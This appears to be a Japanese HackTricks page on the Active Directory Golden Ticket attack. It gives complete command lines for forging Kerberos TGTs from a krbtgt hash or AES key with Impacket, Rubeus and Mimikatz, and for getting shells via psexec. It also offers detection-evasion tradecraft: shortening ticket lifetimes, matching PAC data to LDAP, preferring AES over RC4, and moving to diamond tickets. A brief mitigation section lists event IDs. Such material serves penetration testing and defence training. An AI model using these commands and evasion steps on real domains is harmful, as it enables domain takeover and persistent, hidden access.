# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

**Golden Ticket** 攻撃とは、**Active Directory (AD) の krbtgt アカウントの NTLM hash** を使用して、**任意のユーザーを偽装した正当な Ticket Granting Ticket (TGT) を作成する**手法です。この技術が特に有利なのは、偽装したユーザーとして、ドメイン内の**任意の service や machine へのアクセスを可能にする**ためです。**krbtgt アカウントの credentials は自動更新されない**ことを忘れてはいけません。

**krbtgt アカウントの NTLM hash** を**取得**するには、いくつかの方法があります。ドメイン内の任意の Domain Controller (DC) 上にある **Local Security Authority Subsystem Service (LSASS) process** や **NT Directory Services (NTDS.dit) file** から抽出できます。さらに、**DCsync attack を実行する**こともこの NTLM hash を取得する別の方法であり、**Mimikatz の lsadump::dcsync module** や **Impacket の secretsdump.py script** などの tool を使って実行できます。これらの操作を行うには、通常、**domain admin privileges または同等レベルの access が必要**であることを強調しておくことが重要です。

NTLM hash もこの目的には有効な方法ですが、運用上の security の理由から、**Advanced Encryption Standard (AES) Kerberos keys (AES128 と AES256) を使って ticket を forge することが強く推奨**されます。これは現代の domains ではさらに重要で、**RC4 usage は段階的に廃止されつつあり**、Kerberos telemetry 上でもより明確に目立つためです。
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Modern ticket crafting notes

可能であれば、**最初にLDAPとSYSVOLをクエリし**、その後、手動で値を作るのではなく、実際のドメインポリシーとユーザーPACの値を使ってticketをforgeしてください:
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` は DC にユーザー、グループ、NetBIOS、およびより現実的な PAC を構築するために使われる policy データを要求します。
- `/printcmd` は、取得した PAC フィールドを含む offline command line を出力します。これは、後で LDAP に再度触れずに同じ ticket を forge したい場合に便利です。
- `/extendedupndns` は、`samAccountName` と account SID を含む新しい `UpnDns` PAC 要素を追加します。
- `/oldpac` は、新しい `Requestor` と `Attributes` PAC buffers を削除します。これは主に古い環境との compatibility testing に有用で、default tradecraft 向けではありません。

Linux では、最近の Impacket versions も新しい PAC structures の追加と、現実的な validity period の設定をサポートしています:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` は **hours** です。デフォルトは **10 years** で、これはノイジーです。
- `-extra-pac` は新しい `UPN_DNS` PAC 情報を追加します。
- `-old-pac` はレガシーな PAC レイアウトを強制します。
- `-extra-sid` は、PAC に追加の SIDs が必要な場合に便利です（たとえば、child-to-parent escalation シナリオ。これは [SID-History Injection](sid-history-injection.md) で扱います）。

**Once** `golden Ticket` が **injected** されたら、共有ファイル **(C$)** にアクセスでき、services と WMI を実行できるので、**psexec** や **wmiexec** を使って shell を取得できます（winrm 経由では shell を取得できないようです）。

### Bypassing common detections

golden ticket を検出する最も一般的な方法は、wire 上の **Kerberos traffic** を調べることです。デフォルトでは、Mimikatz は **TGT を 10 years 分署名**するため、その後それを使って行われる TGS requests では異常として目立ちます。

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

`/startoffset`、`/endin`、`/renewmax` パラメータを使って、start offset、duration、最大 renewals（すべて minutes 単位）を制御します。
```
Get-DomainPolicy | select -expand KerberosPolicy
```
残念ながら、TGT の lifetime は 4769 ではログに記録されないため、Windows event logs ではこの情報を見つけることはできません。ただし、関連付けできるのは **先に 4768 がない 4769 を確認すること** です。**TGT なしで TGS を request することはできず**、TGT が発行された記録がないのであれば、それは offline で forged されたと推測できます。

**新しい Windows builds** では、Event IDs **4768** と **4769** が、はるかに優れた **encryption type telemetry** も公開します。`krbtgt`、clients、services がすでに AES keys を持っている domain において、**RC4 (`0x17`)** を使った forged TGT/TGS は、数年前よりもはるかに見つけやすくなっています。これは、**AES-backed Golden Tickets** を優先し、domain の通常の Kerberos policy にできるだけ一致させるべき理由の 1 つです。

もう 1 つの OPSEC 上の問題は **PAC fidelity** です。ありえない group memberships、より新しい PAC buffers の欠落、または LDAP と一致しない account metadata を含む tickets は、defenders が PAC contents を AD data と照合すると、より検出されやすくなります。DC によって本当に発行されたように見える TGT が必要なら、以下を確認してください:

{{#ref}}
diamond-ticket.md
{{#endref}}

永続化には **環境上の制限** もあります。`krbtgt` account は **password history を 2** 保持するため、以前の key で署名された forged TGT は、**最初の** `krbtgt` reset をまたいでも valid のままでいられます。そのため defenders は、**`krbtgt` を 2 回 reset** し、その間に少なくとも domain の最大 ticket lifetime を待つことで Golden Tickets を無効化します。

この検出を **bypass** するには diamond tickets を確認してください。

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

defenders ができる他の小さな工夫としては、default domain administrator account のような sensitive users に対する **4769** を alert することや、通常は AES tickets を発行する domain での `krbtgt` に対する **RC4 usage** を alert することがあります。

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../banners/hacktricks-training.md}}
